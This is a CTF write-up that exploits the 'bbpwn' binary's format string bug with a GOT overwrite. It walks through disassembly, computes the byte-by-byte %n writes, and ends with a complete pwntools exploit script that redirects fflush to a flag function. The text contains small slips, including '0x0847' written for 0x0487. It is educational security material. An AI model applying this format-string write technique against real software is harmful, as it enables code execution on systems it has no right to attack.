---
description: Using arbitrary writes to overwrite a return pointer.
---

# bbpwn

{% file src="../../.gitbook/assets/bbpwn.zip" %}

This is a challenging rendition of the `format` binary where we performed an arbitrary write to change data. In this case, we will modify the return pointer to get code execution.

### Static Analysis

As usual, let's check security on the binary:

```nasm
$ checksec bbpwn
[*] '/home/joybuzzer/Documents/vunrotc/public/binex/03-formats/bbpwn/src/bbpwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We see that there is no canary and no PIE. This means that this code is subject to buffer overflows.

We perform our routine checks in search of anything outstanding. 

{% hint style="info" %}
The original writeup for this challenges uses `radare2`.  `gdb` commands were added later.
{% endhint %}

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  info functions
All defined functions:

Non-debugging symbols:
...
0x0804870b  flag()
0x08048724  main
...
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7fa3850]> afl
...
0x0804870b    1     25 sym.flag__
...
0x08048724    1    214 main
...
```
{% endtab %}
{% endtabs %}


We first check `flag` to make sure we don't have anything to do inside the function:

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  disas flag
Dump of assembler code for function _Z4flagv:
   0x0804870b <+0>:	push   ebp
   0x0804870c <+1>:	mov    ebp,esp
   0x0804870e <+3>:	sub    esp,0x8
   0x08048711 <+6>:	sub    esp,0xc
   0x08048714 <+9>:	push   0x80488e0
   0x08048719 <+14>:	call   0x8048570 <system@plt>
   0x0804871e <+19>:	add    esp,0x10
   0x08048721 <+22>:	nop
   0x08048722 <+23>:	leave  
   0x08048723 <+24>:	ret    
End of assembler dump.
gef➤  x/s 0x80488e0
0x80488e0:	"cat flag.txt"
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7fa3850]> pdf@sym.flag__
┌ 25: sym.flag__ ();
│           0x0804870b      55             push ebp                    ; flag()
│           0x0804870c      89e5           mov ebp, esp
│           0x0804870e      83ec08         sub esp, 8
│           0x08048711      83ec0c         sub esp, 0xc
│           0x08048714      68e0880408     push str.cat_flag.txt       ; 0x80488e0 ; "cat flag.txt"
│           0x08048719      e852feffff     call sym.imp.system         ; int system(const char *string)
│           0x0804871e      83c410         add esp, 0x10
│           0x08048721      90             nop
│           0x08048722      c9             leave
└           0x08048723      c3             ret
```
{% endtab %}
{% endtabs %}

We see that this function just calls `system("cat flag.txt");` without any extra steps.

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  disas main
Dump of assembler code for function main:
   0x08048724 <+0>:	lea    ecx,[esp+0x4]
   0x08048728 <+4>:	and    esp,0xfffffff0
   0x0804872b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804872e <+10>:	push   ebp
   0x0804872f <+11>:	mov    ebp,esp
   0x08048731 <+13>:	push   ecx
   0x08048732 <+14>:	sub    esp,0x214
   0x08048738 <+20>:	mov    eax,ecx
   0x0804873a <+22>:	mov    eax,DWORD PTR [eax+0x4]
   0x0804873d <+25>:	mov    DWORD PTR [ebp-0x20c],eax
   0x08048743 <+31>:	mov    eax,gs:0x14
   0x08048749 <+37>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804874c <+40>:	xor    eax,eax
   0x0804874e <+42>:	sub    esp,0xc
   0x08048751 <+45>:	push   0x80488f0
   0x08048756 <+50>:	call   0x80485e0 <puts@plt>
   0x0804875b <+55>:	add    esp,0x10
   0x0804875e <+58>:	mov    eax,ds:0x804a044
   0x08048763 <+63>:	sub    esp,0xc
   0x08048766 <+66>:	push   eax
   0x08048767 <+67>:	call   0x80485c0 <fflush@plt>
   0x0804876c <+72>:	add    esp,0x10
   0x0804876f <+75>:	mov    eax,ds:0x804a040
   0x08048774 <+80>:	mov    edx,0xc8
   0x08048779 <+85>:	sub    esp,0x4
   0x0804877c <+88>:	push   eax
   0x0804877d <+89>:	push   edx
   0x0804877e <+90>:	lea    eax,[ebp-0x200]
   0x08048784 <+96>:	push   eax
   0x08048785 <+97>:	call   0x8048590 <fgets@plt>
   0x0804878a <+102>:	add    esp,0x10
   0x0804878d <+105>:	mov    eax,ds:0x804a040
   0x08048792 <+110>:	sub    esp,0xc
   0x08048795 <+113>:	push   eax
   0x08048796 <+114>:	call   0x80485c0 <fflush@plt>
   0x0804879b <+119>:	add    esp,0x10
   0x0804879e <+122>:	sub    esp,0x4
   0x080487a1 <+125>:	lea    eax,[ebp-0x200]
   0x080487a7 <+131>:	push   eax
   0x080487a8 <+132>:	push   0x8048914
   0x080487ad <+137>:	lea    eax,[ebp-0x138]
   0x080487b3 <+143>:	push   eax
   0x080487b4 <+144>:	call   0x8048550 <sprintf@plt>
   0x080487b9 <+149>:	add    esp,0x10
   0x080487bc <+152>:	mov    eax,ds:0x804a044
   0x080487c1 <+157>:	sub    esp,0xc
   0x080487c4 <+160>:	push   eax
   0x080487c5 <+161>:	call   0x80485c0 <fflush@plt>
   0x080487ca <+166>:	add    esp,0x10
   0x080487cd <+169>:	sub    esp,0xc
   0x080487d0 <+172>:	lea    eax,[ebp-0x138]
   0x080487d6 <+178>:	push   eax
   0x080487d7 <+179>:	call   0x80485d0 <printf@plt>
   0x080487dc <+184>:	add    esp,0x10
   0x080487df <+187>:	mov    eax,ds:0x804a044
   0x080487e4 <+192>:	sub    esp,0xc
   0x080487e7 <+195>:	push   eax
   0x080487e8 <+196>:	call   0x80485c0 <fflush@plt>
   0x080487ed <+201>:	add    esp,0x10
   0x080487f0 <+204>:	sub    esp,0xc
   0x080487f3 <+207>:	push   0x1
   0x080487f5 <+209>:	call   0x80485f0 <exit@plt>
End of assembler dump.
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7fa3850]> pdf@main
            ; DATA XREF from entry0 @ 0x8048627(w)
┌ 214: int main (char **argv);
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_138h @ ebp-0x138
│           ; var int32_t var_200h @ ebp-0x200
│           ; var int32_t var_20ch @ ebp-0x20c
│           ; arg char **argv @ esp+0x234
│           0x08048724      8d4c2404       lea ecx, [argv]
│           0x08048728      83e4f0         and esp, 0xfffffff0
│           0x0804872b      ff71fc         push dword [ecx - 4]
│           0x0804872e      55             push ebp
│           0x0804872f      89e5           mov ebp, esp
│           0x08048731      51             push ecx
│           0x08048732      81ec14020000   sub esp, 0x214
│           0x08048738      89c8           mov eax, ecx
│           0x0804873a      8b4004         mov eax, dword [eax + 4]
│           0x0804873d      8985f4fdffff   mov dword [var_20ch], eax
│           0x08048743      65a114000000   mov eax, dword gs:[0x14]
│           0x08048749      8945f4         mov dword [var_ch], eax
│           0x0804874c      31c0           xor eax, eax
│           0x0804874e      83ec0c         sub esp, 0xc
│           0x08048751      68f0880408     push str.Hello_baby_pwner__whats_your_name_ ; 0x80488f0 ; "Hello baby pwner, whats your name?"
│           0x08048756      e885feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804875b      83c410         add esp, 0x10
│           0x0804875e      a144a00408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x804a044:4]=0
│           0x08048763      83ec0c         sub esp, 0xc
│           0x08048766      50             push eax
│           0x08048767      e854feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x0804876c      83c410         add esp, 0x10
│           0x0804876f      a140a00408     mov eax, dword [obj.stdin]  ; loc._edata
│                                                                      ; [0x804a040:4]=0
│           0x08048774      bac8000000     mov edx, 0xc8               ; 200
│           0x08048779      83ec04         sub esp, 4
│           0x0804877c      50             push eax
│           0x0804877d      52             push edx
│           0x0804877e      8d8500feffff   lea eax, [var_200h]
│           0x08048784      50             push eax
│           0x08048785      e806feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0804878a      83c410         add esp, 0x10
│           0x0804878d      a140a00408     mov eax, dword [obj.stdin]  ; loc._edata
│                                                                      ; [0x804a040:4]=0
│           0x08048792      83ec0c         sub esp, 0xc
│           0x08048795      50             push eax
│           0x08048796      e825feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x0804879b      83c410         add esp, 0x10
│           0x0804879e      83ec04         sub esp, 4
│           0x080487a1      8d8500feffff   lea eax, [var_200h]
│           0x080487a7      50             push eax
│           0x080487a8      6814890408     push str.Ok_cool__soon_we_will_know_whether_you_pwned_it_or_not._Till_then_Bye__s ; 0x8048914 ; "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s"
│           0x080487ad      8d85c8feffff   lea eax, [var_138h]
│           0x080487b3      50             push eax
│           0x080487b4      e897fdffff     call sym.imp.sprintf        ; int sprintf(char *s, const char *format, ...)
│           0x080487b9      83c410         add esp, 0x10
│           0x080487bc      a144a00408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x804a044:4]=0
│           0x080487c1      83ec0c         sub esp, 0xc
│           0x080487c4      50             push eax
│           0x080487c5      e8f6fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x080487ca      83c410         add esp, 0x10
│           0x080487cd      83ec0c         sub esp, 0xc
│           0x080487d0      8d85c8feffff   lea eax, [var_138h]
│           0x080487d6      50             push eax
│           0x080487d7      e8f4fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080487dc      83c410         add esp, 0x10
│           0x080487df      a144a00408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x804a044:4]=0
│           0x080487e4      83ec0c         sub esp, 0xc
│           0x080487e7      50             push eax
│           0x080487e8      e8d3fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x080487ed      83c410         add esp, 0x10
│           0x080487f0      83ec0c         sub esp, 0xc
│           0x080487f3      6a01           push 1                      ; 1
└           0x080487f5      e8f6fdffff     call sym.imp.exit           ; void exit(int status)
```
{% endtab %}
{% endtabs %}

The most important thing to notice in this disassembly is that there is a format string bug at `0x080487d7`. The address we write to is directly passed as the argument to `printf`.

We'll then check where our input is on the stack when we run it:

```nasm
$ ./bbpwn
Hello baby pwner, whats your name?
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 8048914 ff8e99e8 f7c3a439 f7c0c2f4 f7f365fc f781ab0d ff8e9cb4 0 0 25207825 78252078 20782520 25207825 78252078 20782520
```

We see that we start writing at the 10th offset.

### Plan of Attack

There is no canary to leak. Nothing else happens after the format string bug is triggered, meaning we need to perform some arbitrary write. Overwriting the return pointer of `main()` is not always a great choice because the stack frame is unpredictable.

A better solution is to overwrite the address of another function with the address of `flag`, our desired function. That way, when we call the function, it will call `flag` instead. This is what we call a **GOT overwrite** and will be discussed further at the end of the binary exploitation section.

The reason that the plan of attack is possible is because RELRO is not fully on. RELRO, or **RE**location **L**inked **R**ead-**O**nly, is a security feature that makes the GOT read-only. This means that we cannot overwrite the GOT. However, because RELRO is only **Partial**, we can overwrite the GOT.

### Understanding the Payload

We choose `fflush` as a good candidate for overwriting because it is called right after the format string bug is triggered. This means that we can overwrite the return pointer of `fflush` with the address of `flag`.

Checking the `got` table, we can find the address of `fflush`:

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  got fflush

GOT protection: Partial RelRO | GOT functions: 11
 
[0x804a028] fflush@GLIBC_2.0  →  0x80485c6
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7f448a0]> pxw 4 @ reloc.fflush
0x0804a028  0x080485c6                                   ....
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
For the radare2 output, we can also use `pdf @ sym.imp.fflush` to see the address of the function. This shows us the PLT entry, which jumps us to the address in the GOT (`reloc.fflush`).
{% endhint %}

In the `got` table, `fflush` is at `0x0804a028`. We can verify this by checking the address for an instruction:

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  x/i 0x804a028
   0x804a028 <fflush@got.plt>:	mov    BYTE PTR [ebp-0x7a29f7fc],0x4
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7f448a0]> pd 1 @ reloc.fflush
            ;-- reloc.fflush:
            ; DATA XREF from sym.imp.fflush @ 0x80485c0(x)
            0x0804a028      c6850408d685.  mov byte [ebp - 0x7a29f7fc], 4; RELOC 32 fflush
```
{% endtab %}
{% endtabs %}

We also need the address of `flag`:

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  info functions flag
All functions matching regular expression "flag":

Non-debugging symbols:
0x0804870b  flag()
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0xf7f448a0]> afl | grep flag
0x0804883c    1     26 sym._GLOBAL__sub_I__Z4flagv
0x0804870b    1     25 sym.flag__
```
{% endtab %}
{% endtabs %}

Therefore, we need to change the value at `0x0804a028` to `0x0804870b`.

Let's begin to simulate changing the value at the `fflush` entry in the `got` table. We want to overwrite the value, one byte at a time, until we get the desired value. Consider the following payload:

```python
addrs = p32(0x0804a028) + p32(0x0804a029) + p32(0x0804a02b)
formats = b'%10$n%11$n%12$n'
payload = addrs + formats
```

This means that we're going to write the number of bytes thus far to the address `0x0804a028`, `0x0804a029`, and `0x0804a02b`. If we run `gdb` and stop execution right after the `printf`, we can see what the values are:

```python
p = process('./bbpwn')
gdb.attach(p, gdbscript='b *(main+184)')
```

Checking the addresses at `fflush`:

```nasm
gef➤  x/2wx 0x0804a028
0x804a028 <fflush@got.plt>:	0x52005252	0xf7000000
```

We see that the current value is `0x52` at the lowest byte. Remember that we can only _add_ to the value, meaning to get `0x0b` at that byte, we need to reach `0x10b`. This takes `0x10b-0x52=185` bytes. Therefore, we can append `%185x` into our payload so that many bytes are written first.

{% hint style="warning" %}
#### _Why does this work?_

Note the difference in the format specifier. We are writing `%185x` and **not** `%185$x`. Rather than writing the value of the 185th argument, we are writing the argument provided as a 185-byte value. As a proof-of-concept, consider the following code:

```c
#include <stdio.h>

int main(void)
{
    int bytes = 2;
    printf("%10x", bytes);
}
```
{% endhint %}

This code is going to output 9 spaces then the number 2. Changing the print statement to `printf("%010x", bytes);` prints out `0000000002`.

Let's add this format string to the start of our payload and re-analyze.

```python
addrs = p32(0x0804a028) + p32(0x0804a029) + p32(0x0804a02b)
formats = b'%185x%10$n%11$n%12$n'
payload = addrs + formats
```

{% hint style="danger" %}
#### _Why didn't we put spaces like last time?_

Remember that `%n` prints the number of bytes written thus far. If we write spaces, we add another byte to the count. In theory, we could subtract one from the hex format specifier, but this is less confusing.
{% endhint %}

```nasm
gef➤  x/2wx 0x0804a028
0x804a028 <fflush@got.plt>:	0x0b010b0b	0xf7000001
```

The lower byte is now `0x0b` as desired. Now, let's do the second and third bytes similarly. Our current bytes are `0x010b`, and we need this to be `0x0487`. `0x0847-0x010b=892`. We can add `%892x` to the format string to write that many bytes. This changes the value at that address to:

```nasm
gef➤  x/2wx 0x0804a028
0x804a028 <fflush@got.plt>: 0x8704870b	0xf7000004
```

Finally, to modify the fourth bit, we need to write `0x08` to the fourth byte, which requires `0x108-0x87=129` bytes to be written. This will spill over to the next DWORD, but that's okay because it doesn't prevent us from pulling off this exploit.

### Putting it all Together

Putting together the payload, we have the following exploit:

{% code title="exploit.py" lineNumbers="true" %}
```python
from pwn import *

proc = process('./bbpwn')
print(proc.recvline())

addrs = p32(0x804a028) + p32(0x804a029) + p32(0x804a02b)

flag_val0 = b"%185x%10$n"
flag_val1 = b"%892x%11$n"
flag_val2 = b"%129x%12$n"

payload = addrs + flag_val0 + flag_val1 + flag_val2

proc.sendline(payload)
proc.interactive()
```
{% endcode %}

We notice that `cat flag.txt` is called! Exploiting this on the remote server, we get the flag.
